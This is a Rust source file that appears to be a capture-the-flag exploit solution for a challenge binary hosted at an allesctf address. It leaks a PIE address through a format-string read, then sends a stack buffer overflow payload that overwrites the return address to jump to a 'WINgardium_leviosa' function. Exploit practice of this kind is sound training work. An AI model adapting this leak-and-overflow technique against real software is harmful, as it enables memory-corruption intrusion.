use anyhow::Result;

use std::env::args;

use ctftools::prelude::*;

fn main() -> Result<()> {
	let file_name = args().nth(1).unwrap();
	// checksec(&file_name);
	let exe_syms = get_symbols(&file_name)?;
	let remote = "hax1.allesctf.net:9100";
	let mut p = Process::new(&file_name, false)?;

	println!("Process ID: {:?}", p.get_id());
	pause();

	// Craft format string
	let fmt = format!("%{}$llx", 6 + 0x108 / 8);
	p.write_line(&fmt);

	let prelude = p.read_lines(4);
	println!("{}", &prelude);

	// Leak PIE
	let pie_addr = p.read_until(b' ', false);
	let pie_addr = u64_from_bytes(&pie_addr)?;

	println!("Got pie pointer: {:x}", &pie_addr);
	let pie_base = MemoryBase::new(0x13a0, pie_addr);

	let prelude = p.read_lines(1);
	println!("{}", &prelude);

	// Return to new place function
	let mut buffer = Vec::new();
	buffer.append(&mut b"Expelliarmus\x00".to_vec());
	buffer.extend_from_slice(cyclic(0x108 - buffer.len()).as_bytes());
	buffer.append(&mut p64(pie_base.documented_to_leaked(0x12a1)).to_vec());
	buffer.append(&mut p64(pie_base.documented_to_leaked(exe_syms["WINgardium_leviosa"])).to_vec());
	buffer.push(b'\n');
	p.write(&buffer);

	let result = match p.interactive()? {
		Some(s) => sysexit::from_status(s),
		None => sysexit::Code::Success,
	};
	println!("=> Exited with {}", result);

	Ok(())
}
